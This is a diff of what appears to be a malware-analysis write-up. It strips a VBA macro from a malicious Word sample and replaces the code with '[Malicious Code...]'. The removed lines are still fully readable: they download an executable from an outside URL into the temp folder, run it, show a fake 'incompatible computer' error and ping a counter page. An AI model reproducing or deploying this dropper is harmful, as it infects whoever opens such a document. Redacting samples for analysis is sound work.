@@ -157,20 +157,10 @@ For example, checking the malware sample [DIAN_caso-5415.doc](https://malwr.com/
     SNVJYQ
     End Sub
     Public Sub SNVJYQ()
-        OGEXYR "http://germanya.com.ec/logs/test.exe", Environ("TMP") & "\sfjozjero.
-    exe"
+        [Malicious Code...]
     End Sub
     Function OGEXYR(XSTAHU As String, PHHWIV As String) As Boolean
-        Dim HRKUYU, lala As Long
-        HRKUYU = URLDownloadToFileA(0, XSTAHU, PHHWIV, 0, 0)
-        If HRKUYU = 0 Then OGEXYR = True
-        Dim YKPZZS
-        YKPZZS = Shell(PHHWIV, 1)
-        MsgBox "El contenido de este documento no es compatible con este equipo." &
-    vbCrLf & vbCrLf & "Por favor intente desde otro equipo.", vbCritical, "Equipo no
-     compatible"
-        lala = URLDownloadToFileA(0, "http://germanya.com.ec/logs/counter.php", Envi
-    ron("TMP") & "\lkjljlljk", 0, 0)
+        [Malicious Code...]
         Application.DisplayAlerts = False
         Application.Quit
     End Function
